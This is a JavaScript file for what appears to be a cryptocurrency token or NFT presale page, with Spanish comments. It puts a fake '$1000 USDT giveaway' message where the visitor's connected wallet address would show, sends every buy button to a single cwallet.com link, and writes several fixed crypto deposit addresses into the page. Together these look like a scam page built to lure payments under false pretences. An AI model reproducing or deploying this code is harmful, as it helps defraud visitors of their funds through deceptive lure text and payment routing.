document.addEventListener("DOMContentLoaded", function() {
    // Obtener el elemento span por su id
    var spanElement = document.getElementById("connectedAddress");

    // Verificar si el elemento existe para evitar errores
    if (spanElement) {
        // Modificar el contenido del span
        spanElement.textContent = "Congratulations! You've been chosen for our $1000 USDT giveaway! Buy now and win big! 🚀";
    }
});

document.addEventListener('DOMContentLoaded', function() {
    function handleButtonClick(buttonId, link) {
        var button = document.getElementById(buttonId);
        if (button) {
            button.addEventListener('click', function() {
                window.location.href = link;
            });
        }
    }

    // Asignar acciones a cada botón con sus respectivos enlaces
    handleButtonClick('buynft1', 'https://cwallet.com/t/S3BY486W');
    handleButtonClick('buynft2', 'https://cwallet.com/t/S3BY486W');
    handleButtonClick('buynft3', 'https://cwallet.com/t/S3BY486W');
    handleButtonClick('buynft4', 'https://cwallet.com/t/S3BY486W');
    handleButtonClick('buynft5', 'https://cwallet.com/t/S3BY486W');
    handleButtonClick('buynft6', 'https://cwallet.com/t/S3BY486W');
    handleButtonClick('buynft7', 'https://cwallet.com/t/S3BY486W');
    handleButtonClick('buynft8', 'https://cwallet.com/t/S3BY486W');
});


document.getElementById('bnbInput').addEventListener('input', function() {
    var value = parseFloat(this.value);
    
    // Asegúrate de que el valor es un número válido
    if (isNaN(value)) {
        return;
    }
    
    // Desmarcar todos los botones
    var buttons = document.querySelectorAll('.tab-container .btn');
    buttons.forEach(function(button) {
        button.classList.remove('active'); // Ajusta esto si tienes una clase específica para el botón activo
    });
    
    // Seleccionar el botón correcto basado en el rango
    if (value >= 1 && value <= 99) {
        document.getElementById('20Button').click();
    } else if (value >= 100 && value <= 199) {
        document.getElementById('100Button').click();
    } else if (value >= 200 && value <= 499) {
        document.getElementById('200Button').click();
    } else if (value >= 500 && value <= 999) {
        document.getElementById('500Button').click();
    } else if (value >= 1000 && value <= 1999) {
        document.getElementById('1000Button').click();
    } else if (value >= 2000 && value <= 4999) {
        document.getElementById('2000Button').click();
    } else if (value >= 5000) {
        document.getElementById('5000Button').click();
    }
});



document.addEventListener('DOMContentLoaded', () => {
    const bnbInput = document.getElementById('bnbInput');
    const tokenInput = document.getElementById('tokenInput');
    
    let conversionRate = 0.000002; // Valor inicial de la tasa de conversión

    function updateTokenAmount() {
        const bnbAmount = parseFloat(bnbInput.value) || 0;
        const tokenAmount = bnbAmount / conversionRate;
        tokenInput.value = tokenAmount.toFixed(0); // Ajustar a entero si es necesario
    }

    bnbInput.addEventListener('input', updateTokenAmount);

    // Puedes agregar una función para actualizar la tasa de conversión si es necesario
    function setConversionRate(newRate) {
        conversionRate = newRate;
        updateTokenAmount();
    }

    // Ejemplo de cómo cambiar la tasa de conversión dinámicamente
    // setConversionRate(0.000001); // Llama a esta función con la nueva tasa de conversión cuando sea necesario
});






// Obtener el elemento <p> por su id
var elementoDireccion = document.getElementById("direccion-2");

// Verificar si se encontró el elemento
if (elementoDireccion) {
    // Cambiar el contenido del elemento
    elementoDireccion.textContent = "12pdGzHKaZa9a5DBYTwzU9x3oAG2rwjMYGqBRLkhVcCT";
} else {
    console.error("No se encontró el elemento con id 'direccion-2'");
}


// Cambiar dirección en direccion-1
var direccion1 = document.getElementById("direccion-1");
if (direccion1) {
    direccion1.textContent = "0x19bf023F7bD5e2297140e650dd1FD643A2318f53";
} else {
    console.error("No se encontró el elemento con id 'direccion-1'");
}

// Cambiar dirección en direccion-4
var direccion4 = document.getElementById("direccion-4");
if (direccion4) {
    direccion4.textContent = "0x19bf023F7bD5e2297140e650dd1FD643A2318f53";
} else {
    console.error("No se encontró el elemento con id 'direccion-4'");
}

// Cambiar dirección en direccion-5
var direccion5 = document.getElementById("direccion-5");
if (direccion5) {
    direccion5.textContent = "0x19bf023F7bD5e2297140e650dd1FD643A2318f53";
} else {
    console.error("No se encontró el elemento con id 'direccion-5'");
}

// Cambiar dirección en direccion-3
var direccion3 = document.getElementById("direccion-3");
if (direccion3) {
    direccion3.textContent = "bc1qmf7rsy9pyymes5u87vryrmww4jfr9edumcpnmu";
} else {
    console.error("No se encontró el elemento con id 'direccion-3'");
}




